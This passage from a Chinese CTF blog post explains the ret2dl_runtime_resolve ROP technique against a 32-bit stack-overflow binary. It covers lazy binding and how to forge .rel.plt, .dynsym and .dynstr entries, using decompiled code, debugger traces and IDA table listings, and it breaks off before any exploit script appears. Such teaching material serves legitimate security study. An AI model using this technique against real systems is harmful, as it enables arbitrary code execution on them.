@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了 ret2dllruntime 原理先推荐几个地址学习下  ctf-wiki之高级ROP ctf-wiki之elf文件基本结构  虽然以上不是我的博客，不过这些个大佬帮助了我，给个链">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高级ROP-ret2dl_runtime之通杀详解">
+<meta property="og:url" content="http://yoursite.com/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了 ret2dllruntime 原理先推荐几个地址学习下  ctf-wiki之高级ROP ctf-wiki之elf文件基本结构  虽然以上不是我的博客，不过这些个大佬帮助了我，给个链">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190510172916-147155ac-7306-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png">
+<meta property="og:updated_time" content="2019-09-15T07:17:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="高级ROP-ret2dl_runtime之通杀详解">
+<meta name="twitter:description" content="前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了 ret2dllruntime 原理先推荐几个地址学习下  ctf-wiki之高级ROP ctf-wiki之elf文件基本结构  虽然以上不是我的博客，不过这些个大佬帮助了我，给个链">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png">
+  <link rel="canonical" href="http://yoursite.com/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>高级ROP-ret2dl_runtime之通杀详解 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">高级ROP-ret2dl_runtime之通杀详解
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-09-14 09:17:05" itemprop="dateCreated datePublished" datetime="2019-09-14T09:17:05-07:00">2019-09-14</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-09-15 00:17:32" itemprop="dateModified" datetime="2019-09-15T00:17:32-07:00">2019-09-15</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了</p>
+<h2 id="ret2dllruntime-原理"><a href="#ret2dllruntime-原理" class="headerlink" title="ret2dllruntime 原理"></a>ret2dllruntime 原理</h2><p>先推荐几个地址学习下</p>
+<ul>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop" target="_blank" rel="noopener">ctf-wiki之高级ROP</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure/" target="_blank" rel="noopener">ctf-wiki之elf文件基本结构</a></li>
+</ul>
+<p>虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。<br>ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显的栈溢出<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png" alt="img"></a><br>可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：<br>没有leak，如何做呢，ctf-wiki高级ROP了解一波</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。</p>
+<p>我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">控制程序执行 dl_resolve 函数</span><br><span class="line">    给定 Link_map 以及 index 两个参数。</span><br><span class="line">    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。</span><br><span class="line">控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</span><br><span class="line">伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</span><br><span class="line">伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</span><br></pre></td></tr></table></figure>
+
+<p>此外，这个攻击成功的很必要的条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</span><br><span class="line">dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">    r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure>
+
+<p><strong>相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)</strong><br>这里先说下动态延迟绑定机制：<br>就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度<br>所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处<br>先看下调试部分吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048390  &lt;read@plt&gt;                  jmp    dword ptr [read@got.plt] &lt;0x804a00c&gt;</span><br><span class="line"></span><br><span class="line">   0x8048396  &lt;read@plt+6&gt;                push   0</span><br><span class="line">   0x804839b  &lt;read@plt+11&gt;               jmp    0x8048380</span><br><span class="line">    ↓</span><br><span class="line">   0x8048380                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048386                              jmp    dword ptr [0x804a008] &lt;0xf7fe96c0&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fe96c0 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fe96c1 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fe96c2 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fe96c3 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fe96c7 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fe96cb &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe3ac0&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这是我在read@plt处下断，</p>
+<ul>
+<li>你看他第一次调用的时候，<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>里存的是下一条指令的地址，也就是0x8048396，</li>
+<li>然后将read函数在表里的偏移push进去，这里push的是0，</li>
+<li>然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>表里，然后将程序的控制权交给解析出来的地址指向的函数</li>
+</ul>
+<p><strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong><br>这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程<br>我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。</p>
+<h2 id="elf部分的关键点（来自ctf-wiki"><a href="#elf部分的关键点（来自ctf-wiki" class="headerlink" title="elf部分的关键点（来自ctf-wiki)"></a>elf部分的关键点（来自ctf-wiki)</h2><p>动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。</p>
+<ol>
+<li>当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。</li>
+<li>如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。</li>
+<li>这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。</li>
+<li>那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。</li>
+<li>因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。</li>
+<li>在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。</li>
+<li>当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。</li>
+<li>过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。</li>
+</ol>
+<p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用</p>
+<p>_dl_runtime_resolve(link_map_obj, reloc_index)</p>
+<p>这里以 32 位为例（64 位类似），具体的过程如下</p>
+<ul>
+<li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index</li>
+<li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li>
+<li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li>
+<li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li>
+<li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<ul>
+<li>if (sym-&gt;st_other) &amp; 3 == 0 )</li>
+<li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li>
+</ul>
+</li>
+<li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li>
+<li><ul>
+<li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li>
+</ul>
+</li>
+<li><ul>
+<li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li>
+</ul>
+</li>
+<li>根据 name 来寻找相应函数在库中的地址。<ul>
+<li>name = STRTAB + sym-&gt;st_name</li>
+</ul>
+</li>
+</ul>
+<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了<br>简单来说，ret2dllruntime这个攻击方式他要利用三个表:</p>
+<ol>
+<li>.rel.plt</li>
+<li>.dynsym</li>
+<li>.dynstr</li>
+<li>他先从.rel.plt表里找到某个函数在dynsym里的偏移</li>
+<li>然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移</li>
+<li>在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数<br>所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的<br>贴张图，这是整体结构部分图</li>
+</ol>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png" alt="img"></a></p>
+<h3 id="第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><a href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table" class="headerlink" title="第一个表是.rel.plt也就是ELF REL Relocation Table"></a>第一个表是.rel.plt也就是ELF REL Relocation Table</h3><p>这个表里有个结构体，存储了写入位置和具体偏移量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804831C ; ELF REL Relocation Table</span><br><span class="line">LOAD:0804831C                 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048324                 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderr</span><br><span class="line">LOAD:0804832C                 Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048334                 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:0804833C ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0804833C                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048344                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarm</span><br><span class="line">LOAD:0804834C                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048354                 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbuf</span><br><span class="line">LOAD:08048354 LOAD            ends</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">           Elf32_Addr r_offset;</span><br><span class="line">           Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找</li>
+</ul>
+<h3 id="第二个表是-dynsym也就是ELF-Symbol-Table"><a href="#第二个表是-dynsym也就是ELF-Symbol-Table" class="headerlink" title="第二个表是.dynsym也就是ELF Symbol Table"></a>第二个表是.dynsym也就是ELF Symbol Table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481DC ; ELF Symbol Table</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804821C                            0&gt;</span><br><span class="line">LOAD:0804822C                 Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;</span><br><span class="line">LOAD:0804823C                 Elf32_Sym &lt;offset aStdout - offset byte_804827C, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:0804823C                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804824C                 Elf32_Sym &lt;offset aStderr - offset byte_804827C, \ ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804824C                            offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804825C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804825C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804826C                 Elf32_Sym &lt;offset aStdin - offset byte_804827C, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:0804826C                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure>
+
+<p>我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的</p>
+<h3 id="第三个表就是-dynstr了，也就是ELF-String-Table"><a href="#第三个表就是-dynstr了，也就是ELF-String-Table" class="headerlink" title="第三个表就是.dynstr了，也就是ELF String Table"></a>第三个表就是.dynstr了，也就是ELF String Table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804827C ; ELF String Table</span><br><span class="line">LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804827C                                         ; LOAD:080481FC↑o ...</span><br><span class="line">LOAD:0804827D aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048287 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048296 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:0804829C aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:080482A1 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482A8 aStderr         db &apos;stderr&apos;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:080482AF aAlarm          db &apos;alarm&apos;,0            ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:080482B5 aSetvbuf        db &apos;setvbuf&apos;,0          ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:080482BD aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482BD                                         ; DATA XREF: 